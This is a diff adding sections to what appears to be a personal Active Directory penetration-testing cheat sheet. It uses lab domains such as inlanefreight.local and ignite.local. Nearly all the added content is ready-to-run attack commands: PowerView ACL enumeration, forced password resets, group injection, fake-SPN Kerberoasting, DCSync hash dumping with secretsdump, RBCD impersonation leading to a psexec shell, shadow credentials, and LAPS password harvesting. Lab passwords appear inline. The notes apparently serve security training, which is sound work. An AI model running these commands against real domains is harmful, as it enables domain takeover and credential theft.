@@ -1931,6 +1931,8 @@
 > 
 > ```
 > ldapsearch -x -H ldap://192.168.x.100 -D "stephanie@corp.local" -w 'Password123' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description memberOf
+> #search for guid
+ldapsearch -x -H ldap://172.16.5.5 -D "sqldev@inlanefreight.local" -w 'database!' -b "DC=inlanefreight,DC=local" "(&(objectClass=user)(sAMAccountName=forend))" sAMAccountName description objectGUID
 > ```
 
 
@@ -2234,6 +2236,52 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 .\SharpHound.exe -c All --zipfilename ILFREIGHT
 ```
 
+
+> [!check] ACL Enum
+```
+# Perform an extensive, unfiltered search for interesting ACLs across the entire domain (noisy)
+Find-InterestingDomainAcl
+
+# Convert a target domain username to its corresponding unique Security Identifier (SID)
+$sid = Convert-NameToSid wley
+
+# Locate domain objects where a specific account SID has explicit rights (unresolved raw GUIDs)
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# Map a specific unresolved Active Directory Rights-GUID to its human-readable property name
+$guid = "00299570-246d-11d0-a768-00aa006e0529"
+Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ? {$_.rightsGuid -eq $guid} | fl
+
+# Enumerate objects a specific SID has control over with human-readable permissions resolved automatically
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# Export a complete flat list of all domain user samAccountNames to a local text file
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+
+# Manually parse explicit ACE entries targeting a specific user via a native PowerShell loop (No PowerView required)
+foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {Get-Acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
+
+# Convert the second target account name to its corresponding SID for chained path discovery
+$sid2 = Convert-NameToSid damundsen
+
+# Discover all downstream objects controlled by the secondary compromised account with resolved GUIDs
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
+
+# Query group configurations to determine nesting structures and inherited parent memberships
+Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+
+# Convert a target security group name to its corresponding SID for rights mapping
+$itgroupsid = Convert-NameToSid "Information Technology"
+
+# Audit permissions granted to a nested parent group to identify transitive control vectors
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+
+# Convert the high-value target user name to its corresponding SID to verify critical edge permissions
+$adunnsid = Convert-NameToSid adunn
+
+# Audit inbound permissions on the domain root object for a user to verify DCSync rights
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
+```
 ## Phase 2: Credential Attacks (Quick Wins)
 
 ### AS-REP Roasting
@@ -2849,6 +2897,285 @@ Get-LAPSComputers
 > ```
 
 ### ACL Abuse — Common Paths from BloodHound
+
+>[!check] ACL Abuse
+```
+# AD ACL Abuse Chain Command Summary
+
+# 1. Create a credential object for the 'wley' account (initial foothold)
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+
+# 2. Define the new target password block for the 'damundsen' account
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+# 3. Force change the target user's password using wley's administrative credentials
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+# 4. Create a new credential object using the newly compromised 'damundsen' account
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+
+# 5. Check the current membership list of the target Help Desk group
+Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+
+# 6. Leverage GenericWrite rights to add 'damundsen' to the Help Desk Level 1 group
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+# 7. Verify that the user was successfully added to the target group
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+# 8. Leverage inherited GenericAll rights to write a fake SPN attribute to 'adunn'
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+# 9. Request a service ticket for the newly created fake SPN to extract the hash
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+
+# 10. Clean up: Erase the fake SPN attribute from the adunn user object
+Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+# 11. Clean up: Remove damundsen from the Help Desk Level 1 group
+Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+
+# 12. Clean up verification: Confirm damundsen was successfully evicted from the group
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+
+# 13. Defensive: Convert an SDDL security string from Event ID 5136 into readable text
+ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)..."
+```
+
+>[!check] ACL Abuse 🩸 BloodyAD & Impacket Master Field Manual
+```
+> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get children --otype useronly
+> ```
+
+> [!notes] **OU & Container Mapping**
+> Enumerate the Active Directory structural architecture to evaluate Group Policy (GPO) boundary placements.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get children --otype container
+> ```
+
+> [!notes] **Network Zone DNS Dump**
+> Extract internal active DNS records filelessly to map hidden endpoints, staging servers, and subnet bridges.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get dnsDump
+> ```
+
+---
+
+## 👥 Phase 2 — Privilege & Membership Analysis
+
+> [!notes] **Individual Group Scoping**
+> Inspect the structural security groups a target user account currently inherits or holds direct access to.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get membership raj
+> ```
+
+> [!notes] **High-Privilege Roster Dumping**
+> Query the explicit `member` attributes of the Domain Admins group to isolate highly privileged accounts.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get object "Domain Admins" --attr member
+> ```
+
+> [!notes] **Deep LDAP Attribute Inspection**
+> Dump all properties from a target user's schema data to catch cleartext backdoors, descriptions, or administrative tracking bits.
+> 
+```bash
+> bloodyAD -d ignite.local -u administrator -p Ignite@987 --host 192.168.1.11 get object aaru
+> ```
+
+---
+
+## ⚙️ Phase 3 — Account Management Attacks
+
+> [!notes] **Account Disabling Control**
+> Toggle User Account Control flags to apply an administrative lock on an active user account.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u Administrator -p 'Ignite@987' add uac tom -f ACCOUNTDISABLE
+> ```
+
+> [!notes] **Account Enabling Control**
+> Strip away the restriction flag to cleanly restore or verify active authentication capabilities on a user account.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u Administrator -p 'Ignite@987' remove uac tom -f ACCOUNTDISABLE
+> ```
+
+> [!notes] **Machine Account Quota (MAQ) Triage**
+> Read the root domain descriptor property to check if standard users can spin up fresh computer objects.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u Administrator -p 'Ignite@987' get object "DC=ignite,DC=local" --attr ms-DS-MachineAccountQuota
+> ```
+
+---
+
+## 🏹 Phase 4 — Kerberos-Based Attacks
+
+> [!notes] **SPN Modification (Kerberoasting Setup)**
+> Write a fake Service Principal Name to a target account to make it targetable via Kerberoasting engines.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u Administrator -p 'Ignite@987' set object raj servicePrincipalName -v 'ignite/hackingarticles'
+> ```
+
+> [!notes] **Kerberoastable Account Hunting**
+> Sweep the domain using LDAP search filters to locate all non-disabled accounts carrying custom SPN attributes.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
+> ```
+
+> [!notes] **AS-REP Roasting Activation**
+> Disable mandatory Kerberos pre-authentication flags on a user account to capture a crackable hash over the wire.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p Ignite@987 add uac yashika -f DONT_REQ_PREAUTH
+> ```
+
+> [!notes] **AS-REP Roasting Hash Extraction**
+> Extract the crackable cipher suite ticket for accounts that do not require pre-authentication using Impacket.
+> 
+```bash
+> impacket-GetNPUsers ignite.local/yashika -dc-ip 192.168.1.11 -no-pass
+> ```
+
+---
+
+## 🔨 Phase 5 — User & Credential Manipulation
+
+> [!notes] **New User Creation**
+> Provision a fresh user account directly inside the Active Directory database.
+> 
+```bash
+> bloodyAD -d ignite.local -u administrator -p Ignite@987 --host 192.168.1.11 add user kinjal Password@1
+> ```
+
+> [!notes] **Object Profile Verification**
+> Read back the newly initialized user object parameters via LDAP to ensure proper placement.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p Ignite@987 get object kinjal
+> ```
+
+> [!notes] **Expose LAPS Registry Passwords**
+> Query LAPS attributes across computer records to harvest cleartext local administrator strings.
+> 
+```bash
+> bloodyAD --host "192.168.1.11" -d "ignite.local" -u "aarti" -p "Password@1" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+> ```
+
+> [!notes] **Mass Password/Description Scraping**
+> Audit domain properties to find cleartext passwords mistakenly typed into description fields.
+> 
+```bash
+> bloodyAD -u raj -p 'Password@1' -d ignite.local --host 192.168.1.48 get search --filter '(|(userPassword=*)(description=*))' --attr userPassword,description
+> ```
+
+---
+
+## 🔑 Phase 6 — DCSync Attack Path
+
+> [!notes] **Grant Replication Rights**
+> Inject complete directory replication rights (`GetChangesAll`) onto a controlled user account.
+> 
+```bash
+> bloodyAD -d ignite.local -u administrator -p Ignite@987 --host 192.168.1.11 add dcsync kinjal
+> ```
+
+> [!notes] **Execute DCSync Hash Dump**
+> Masquerade as a Domain Controller using Impacket to dump the domain's entire NT hash vault database.
+> 
+```bash
+> impacket-secretsdump ignite.local/kinjal:Password@1@192.168.1.11
+> ```
+
+> [!notes] **Revoke Replication Rights**
+> Strip away the directory replication rights from the user account to return the domain to a clean state.
+> 
+```bash
+> bloodyAD -d ignite.local -u administrator -p Ignite@987 --host 192.168.1.11 remove dcsync kinjal
+> ```
+
+---
+
+## 🎭 Phase 7 — AD ACL Abuse Techniques
+
+> [!notes] **Abuse ForceChangePassword Rights**
+> Forcibly overwrite an account's password string without needing to know or verify their current credential.
+> 
+```bash
+> bloodyAD -d ignite.local -u natasha -p Password@1 --host 192.168.1.11 set password hulk Ironman@123
+> ```
+
+> [!notes] **Validate Password Reset via LDAP**
+> Authenticate via NetExec to quickly verify the new password baseline.
+> 
+```bash
+> nxc ldap 192.168.1.11 -u hulk -p Ironman@123
+> ```
+
+> [!notes] **Grant GenericAll on Security Groups**
+> Modify group access descriptors to grant an account full configuration control over a target security group.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p Ignite@987 add genericAll "CN=Domain Admins,CN=Users,DC=ignite,DC=local" aaru
+> ```
+
+> [!notes] **Abuse GenericAll to Join Group**
+> Leverage the newly assigned control permissions to inject an account straight into the Domain Admins group.
+> 
+```bash
+> bloodyAD --host "192.168.1.11" -d "ignite.local" -u "aaru" -p "Password@1" add groupMember "Domain Admins" "aaru"
+> ```
+
+---
+
+## 🔀 Phase 8 — Resource-Based Constrained Delegation (RBCD)
+
+> [!notes] **Create Fake Computer Account**
+> Abuse default domain privileges to register a new machine account to act as the delegation bridge head.
+> 
+```bash
+> bloodyAD -u geet -p 'Password@1' -d ignite.local --host 192.168.1.11 add computer fakecomp 'Password@123'
+> ```
+
+> [!notes] **Configure RBCD Impersonation Pathway**
+> Write the fake computer's SID into the Domain Controller's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
+> 
+```bash
+> bloodyAD --host 192.168.1.11 -u geet -p 'Password@1' -d ignite.local add rbcd 'DC$' 'fakecomp$'
+> ```
+
+> [!notes] **Request Constrained Impersonation Ticket**
+> Execute an S4U Kerberos ticket transaction to impersonate a Domain Administrator over the target DC service.
+> 
+```bash
+> impacket-getST ignite.local/'fakepc$':Password@123 -spn cifs/DC.ignite.local -impersonate administrator -dc-ip 192.168.1.11
+> ```
+
+> [!notes] **Pass-the-Ticket Command Shell**
+> Export the recovered ccache service ticket payload to drop into an administrative command console.
+> ```bash
+> export KRB5CCNAME=administrator@cifs_dc.ignite.local@IGNITE.LOCAL.ccache
+> impacket-psexec ignite.local/administrator@DC.ignite.local -k -no-pass -dc-ip 192.168.1.11
+> ```
+
+---
+
+## 👤 Phase 9 — Shadow Credentials Attack
+
+> [!notes] **Register Public Key Mapping**
+> Inject a fresh certificate configuration directly into a target computer's `msDS-KeyCredentialLink` property.
+> ```bash
+> bloodyAD --host 192.168.1.11 -u sita -p Password@1 -d ignite.local add shadowCredentials DC$
+> ```
+```
 
 > [!example] 🪟 PowerShell: Forcing Domain Object Security Secret Resets via Write Configuration Rights Abuses
 > 
